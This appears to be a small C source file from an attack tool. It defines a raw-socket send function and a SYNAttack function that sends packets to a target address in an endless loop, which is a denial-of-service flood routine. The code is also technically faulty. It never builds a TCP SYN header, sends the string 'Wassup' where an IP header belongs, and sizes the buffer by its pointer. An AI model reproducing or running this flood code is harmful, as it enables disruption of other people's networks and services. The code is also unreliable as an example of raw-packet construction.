#include "Attack.h"

void sendRawPacket(struct ipheader* ip)
{

    struct sockaddr_in client;
    char enable = 1;
    const char* buffer = "Wassup";

    SOCKET sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &enable, sizeof(enable));

    client.sin_family = AF_INET;
    client.sin_addr = ip->iph_destip;


    sendto(sock, buffer, sizeof(buffer), 0, (struct sockaddr*)&client, sizeof(client));

    closesocket(sock);
}

void SYNAttack(ipheader* tcp_packet)
{
    while (true)
    {
        sendRawPacket(tcp_packet);
    }
}